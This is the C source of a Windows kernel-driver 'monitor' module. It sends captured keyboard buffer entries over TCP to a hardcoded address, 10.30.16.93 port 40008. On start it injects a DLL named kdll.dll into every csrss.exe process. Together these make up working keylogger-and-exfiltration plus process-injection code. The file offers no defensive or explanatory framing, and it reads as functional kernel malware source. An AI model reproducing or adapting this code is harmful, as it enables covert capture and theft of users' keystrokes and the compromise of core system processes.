#include <inc/klogger.h>
#include <inc/mwsk.h>
#include <inc/monitor.h>
#include <inc/systhread.h>
#include <inc/keybrd.h>
#include <inc/inject.h>
#include <inc/sysworker.h>

#define __SUBCOMPONENT__ "ecore"

static MONITOR g_Monitor;

VOID MonitorSendKbdBufWorker(PKBD_BUFF_ENTRY BuffEntry)
{
	NTSTATUS Status;
	SOCKADDR_IN LocalAddress;
	SOCKADDR_IN RemoteAddress;
	PMSOCKET Socket = NULL;
	UNICODE_STRING NodeName = RTL_CONSTANT_STRING(L"10.30.16.93");
	UNICODE_STRING ServiceName = RTL_CONSTANT_STRING(L"40008");
	UNICODE_STRING RemoteName = { 0, 0, NULL };
	PMONITOR Monitor = MonitorGetInstance();

	IN4ADDR_SETANY(&LocalAddress);

	Status = MWskResolveName(
		Monitor->WskContext,
		&NodeName,
		&ServiceName,
		NULL,
		&RemoteAddress
		);

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskResolveName error %x for name %wZ %wZ", Status, &NodeName, &ServiceName);
		goto cleanup;
	}

	Status = MWskSockAddrToStr(&RemoteAddress, &RemoteName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSockAddrToStr failure %x", Status);
		goto cleanup;
	}

	//KLog(LInfo, "Remote name %ws", RemoteName.Buffer);

	Status = MWskSocketConnect(Monitor->WskContext, SOCK_STREAM, IPPROTO_TCP, (PSOCKADDR)&LocalAddress, (PSOCKADDR)&RemoteAddress, &Socket);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSocketConnect error %x", Status);
		goto cleanup;
	}

	Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSendAll error %x", Status);
	}

cleanup:
    if (RemoteName.Buffer != NULL) {
        ExFreePool(RemoteName.Buffer);
    }

    if (Socket != NULL)
        MWskSocketRelease(Socket);
}

VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry)
{
	SysWorkerAddWork(&Monitor->NetWorker, MonitorSendKbdBufWorker, BuffEntry);
}

VOID MonitorInjectDllWorker(PVOID Context)
{
	PMONITOR Monitor = MonitorGetInstance();

	UNICODE_STRING ProcPrefix = RTL_CONSTANT_STRING(L"csrss.exe");
	UNICODE_STRING DllPath = RTL_CONSTANT_STRING(L"\\\\?\\C:\\test");
	UNICODE_STRING DllName = RTL_CONSTANT_STRING(L"kdll.dll");
	
	InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);
}

PMONITOR
	MonitorGetInstance(VOID)
{
	return &g_Monitor;
}

VOID
	MonitorInitInternal(PMONITOR Monitor)
{
	KeInitializeGuardedMutex(&Monitor->Mutex);
	SysWorkerInit(&Monitor->InjectWorker);
	SysWorkerInit(&Monitor->NetWorker);
	Monitor->State = MONITOR_STATE_STOPPED;
}

NTSTATUS
    MonitorStartInternal(PMONITOR Monitor)
{
    NTSTATUS Status;

	KeAcquireGuardedMutex(&Monitor->Mutex);
	if (Monitor->State == MONITOR_STATE_STARTED) {
		KLog(LError, "Monitor already started");
		KeReleaseGuardedMutex(&Monitor->Mutex);
		return STATUS_TOO_LATE;
	}

	Monitor->WskContext = MWskCreate();
    if (Monitor->WskContext == NULL) {
        KLog(LError, "MWskCreate failed");
		goto start_failed;
    }

	Status = SysWorkerStart(&Monitor->NetWorker);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SysWorkerStart failed err=%x", Status);
		goto start_failed;
	}

	Status = SysWorkerStart(&Monitor->InjectWorker);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SysWorkerStart failed err=%x", Status);
		goto start_failed;
	}

	SysWorkerAddWork(&Monitor->InjectWorker, MonitorInjectDllWorker, NULL);
	Monitor->State = MONITOR_STATE_STARTED;
	KeReleaseGuardedMutex(&Monitor->Mutex);

	return STATUS_SUCCESS;

start_failed:
	SysWorkerStop(&Monitor->InjectWorker);
	SysWorkerStop(&Monitor->NetWorker);
	if (Monitor->WskContext != NULL) {
		MWskRelease(Monitor->WskContext);
		Monitor->WskContext = NULL;
	}

	Monitor->State = MONITOR_STATE_STOPPED;

	KeReleaseGuardedMutex(&Monitor->Mutex);

    return Status;
}

NTSTATUS
	MonitorStopInternal(PMONITOR Monitor)
{
	KeAcquireGuardedMutex(&Monitor->Mutex);
	if (Monitor->State == MONITOR_STATE_STOPPED) {
		KLog(LError, "Monitor already stopped");
		KeReleaseGuardedMutex(&Monitor->Mutex);
		return STATUS_TOO_LATE;
	}

	SysWorkerStop(&Monitor->NetWorker);
	SysWorkerStop(&Monitor->InjectWorker);

	if (Monitor->WskContext != NULL) {
		MWskRelease(Monitor->WskContext);
		Monitor->WskContext = NULL;
	}

	Monitor->State = MONITOR_STATE_STOPPED;
	KeReleaseGuardedMutex(&Monitor->Mutex);

	return STATUS_SUCCESS;
}

NTSTATUS
    MonitorStart()
{   
    KLog(LInfo, "MonitorStart");
 
	return MonitorStartInternal(&g_Monitor);
}

NTSTATUS
    MonitorStop()
{
    KLog(LInfo, "MonitorStop");

    return MonitorStopInternal(&g_Monitor);
}

VOID
	MonitorInit()
{
	MonitorInitInternal(&g_Monitor);
}
